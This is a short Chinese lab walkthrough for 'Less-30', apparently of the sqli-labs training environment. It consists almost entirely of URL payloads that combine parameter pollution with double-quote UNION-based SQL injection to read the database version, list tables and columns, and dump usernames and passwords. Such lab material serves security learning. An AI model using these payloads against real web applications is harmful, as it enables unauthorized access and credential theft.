# Less-30

用注入语句，但是将单引号换成双引号

~~~ cmd
?id=1&id=0" --+
~~~



~~~ cmd
?id=1&id=0" union select 1,2,3--+
~~~

![](.\img\Less-30-01.png)



~~~ cmd
?id=1&id=0%22%20union%20select%201,version(),database()--+
~~~

![](.\img\Less-30-02.png)



~~~ cmd
?id=1&id=0%22%20union%20select%201,database(),group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27security%27--+
~~~

![](.\img\Less-30-03.png)



~~~ cmd
?id=1&id=0%22%20union%20select%201,database(),group_concat(column_name)%20from%20information_schema.columns%20where%20table_name=%27users%27--+
~~~

![](.\img\Less-30-04.png)



~~~ cmd
?id=1&id=0%22%20union%20select%201,database(),group_concat(username,password)%20from%20users--+
~~~

![](.\img\Less-30-05.png)